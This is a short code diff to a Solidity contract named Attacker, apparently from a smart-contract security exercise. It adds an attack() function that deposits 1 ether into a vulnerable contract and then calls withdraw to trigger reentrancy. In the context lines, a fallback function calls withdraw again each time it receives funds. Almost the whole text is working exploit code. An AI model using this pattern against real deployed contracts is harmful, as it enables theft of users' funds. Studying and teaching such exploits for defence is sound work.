@@ -18,4 +18,14 @@ contract Attacker {
             vul.withdraw(1 ether);
         }
     }
+
+    function attack() external payable {
+        require(msg.value >= 1 ether, "Need at least 1 ETH to attack");
+        
+        // Donate first
+        vul.donate{value: 1 ether}();
+
+        // Trigger reentrancy
+        vul.withdraw(1 ether);
+    }
 }
